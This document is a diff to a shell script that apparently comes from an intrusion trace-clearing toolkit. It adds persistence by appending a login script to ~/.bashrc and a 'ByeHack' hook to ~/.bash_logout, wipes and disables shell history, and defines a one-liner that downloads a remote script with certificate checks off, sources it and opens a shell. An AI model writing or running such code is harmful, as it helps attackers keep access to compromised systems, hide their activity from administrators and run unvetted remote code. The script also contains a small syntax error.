@@ -1,5 +1,20 @@
+if [ -f ~/.bashrc ];then 
+  cp ~/.bashrc /tmp/_bash
+else:
+  touch /tmp/_bash
+fi
 
-history -c 
+if [ -f ~/.bash_logout ];then
+  cp ~/.bash_logout /tmp/_bash_out
+else
+  touch /tmp/_bash_out
+fi
+
+cat login.sh >> ~/.bashrc
+echo "ByeHack; " >> ~/.bash_logout;
+history -c ;
+
+
 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
 export HISTFILE=/dev/null;
 export HISTSIZE=0;
@@ -38,10 +53,12 @@ function CL {
     fi
 }
 
-function Bye {
+function ByeHack {
+  cp /tmp/_bash ~/
+  cp /tmp/_bash_out ~/
   CL
   _resume;
-  pkill -9 $my_pts
 }
 
-export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; rm clear.sh ; echo ok ; bash"
+
+export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; echo ok ; bash"
